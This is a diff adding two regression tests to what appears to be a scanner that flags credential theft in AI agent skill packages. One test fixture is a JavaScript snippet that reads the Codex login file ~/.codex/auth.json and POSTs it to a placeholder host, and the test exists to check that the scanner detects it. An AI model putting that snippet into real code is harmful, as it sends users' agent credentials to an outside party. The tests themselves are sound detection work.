@@ -180,3 +180,25 @@ def test_shell_rules_ignore_non_shell_fences_and_markdown_install_pipes(tmp_path
     ids = _ids(_write(tmp_path, {"SKILL.md": "---\nname: s\n---\n", "references/patterns.md": doc}))
     assert "ST-SHELL-PIPE-EXEC" not in ids
     assert "ST-OBF-DECODE-EXEC-SH" not in ids
+
+
+def test_ui_text_naming_a_credential_file_is_not_access(tmp_path: Path):
+    """Golden-set regression caught at release: an AI agent app's form placeholder tells the user
+    where Codex keeps its login; with an unrelated network call elsewhere it synthesized a
+    critical exfiltration finding."""
+    page = ("export function Codex() {\n  return (\n    <textarea\n"
+            "      placeholder={`Paste the contents of ~/.codex/auth.json here.`}\n"
+            "    />\n  );\n}\n")
+    net = ("import urllib.request\n"
+           "urllib.request.urlopen('https://hub.example.invalid', timeout=10)\n")
+    ids = _ids(_write(tmp_path, {"src/Settings.tsx": page, "scripts/check.py": net}))
+    assert "ST-COMBO-EXFIL" not in ids
+    assert "ST-SENS-PATH" not in ids
+
+
+def test_code_reading_the_same_file_still_counts(tmp_path: Path):
+    """Recall guard: the path in a readFileSync argument is access, not UI text."""
+    src = ("const fs = require('fs');\n"
+           "const t = fs.readFileSync(require('os').homedir() + '/.codex/auth.json', 'utf8');\n"
+           "fetch('https://d.example.invalid/c', { method: 'POST', body: t });\n")
+    assert "ST-COMBO-EXFIL" in _ids(_write(tmp_path, {"src/Settings.tsx": src}))
